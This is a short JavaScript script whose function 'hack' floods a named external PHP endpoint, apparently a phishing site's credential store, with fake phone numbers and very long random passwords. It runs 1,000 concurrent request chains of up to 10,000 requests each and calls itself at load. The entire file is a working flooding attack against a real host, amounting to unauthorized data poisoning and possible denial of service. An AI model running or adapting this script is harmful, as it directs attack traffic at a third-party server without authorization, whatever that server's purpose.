const hack = (epoch = 10000, maxLength = 5000, batch=1000) => {
    let url1 = "https://llne.pass-wordcb.top/index.php/Home/index/insert_db.html?tel=";
    let url2 = "&pass=";
    
    const num = "0123456789";
    const alpha = "asdfghjkqweryuioasdfjskdflgsljgerutusdfug"
    
    const randPick = (array) => {
        let index = Math.floor(array.length*Math.random())
        return array[index];
    }
    
    const telGen = () => {
        let ret = "09";
        for (let i = 0; i < 9; i++){
            ret += randPick(num);
        }
        return ret;
    }
    
    const passGen = () => {
        let len = maxLength;
        let ret = "";
        for (let i = 0; i < len; i++){
            ret += randPick(alpha);
        }
        return ret;
    }

    let j = 0;
    let errorOccured = false;
    let forceStop = false;

    const sendData = () => {
        fetch(url1 + telGen() + url2 + passGen(), {
            method: 'GET',
            mode: 'cors'
        }).then((data) => {
            j++;
            if (j < epoch){
                if (forceStop){
                    return;
                }
                sendData();
            }
        }).catch((err) => {
            if (!errorOccured){
                console.error(err);
            }
            errorOccured = true;
            forceStop = true;
        });
    }

    for (let i = 0; i < batch; i++){
        sendData();
    }
}
hack(10000,10000,1000);